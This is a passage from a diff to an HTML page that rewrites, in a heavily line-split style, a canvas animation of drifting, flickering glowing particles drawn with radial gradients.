-      ctx.arc(p.x, p.y, p.radius * 4, 0, Math.PI * 2, false);
-      ctx.fill();
-    });
+        radius:
+          Math.random() * 2 + 1,
 
-    requestAnimationFrame(animate);
-  }
+        dx:
+          (Math.random() - 0.5) * 0.5,
 
-  animate();
-</script>
+        dy:
+          (Math.random() - 0.5) * 0.5,
+
+        opacity:
+          Math.random(),
+
+        flickerSpeed:
+          Math.random() * 0.02 + 0.005
+
+      });
+
+    }
+
+
+    function animate() {
+
+      ctx.clearRect(
+        0,
+        0,
+        width,
+        height
+      );
+
+
+      particles.forEach(
+        function (p) {
+
+
+          p.x +=
+            p.dx;
+
+
+          p.y +=
+            p.dy;
+
+
+          if (
+            p.x < 0 ||
+            p.x > width
+          ) {
+
+            p.dx *= -1;
+
+          }
+
+
+          if (
+            p.y < 0 ||
+            p.y > height
+          ) {
+
+            p.dy *= -1;
+
+          }
+
+
+          p.opacity +=
+            p.flickerSpeed;
+
+
+          if (
+            p.opacity >= 1 ||
+            p.opacity <= 0.3
+          ) {
+
+            p.flickerSpeed *= -1;
+
+          }
+
+
+          const gradient =
+            ctx.createRadialGradient(
+              p.x,
+              p.y,
+              0,
+              p.x,
+              p.y,
+              p.radius * 4
+            );
+
+
+          gradient.addColorStop(
+            0,
+            `rgba(
+              255,
+              255,
+              255,
+              ${p.opacity}
+            )`
+          );
+
+
+          gradient.addColorStop(
+            1,
+            "rgba(255,255,255,0)"
+          );
+
+
+          ctx.fillStyle =
+            gradient;
+
+
+          ctx.beginPath();
+
+
+          ctx.arc(
+            p.x,
+            p.y,
+            p.radius * 4,
+            0,
+            Math.PI * 2,
+            false
+          );
+
+
+          ctx.fill();
+
+        }
+      );
+
+
+      requestAnimationFrame(
+        animate
+      );
+
+    }
+
+
+    animate();
+
+  </script>
+
+
 </body>
+
 </html>
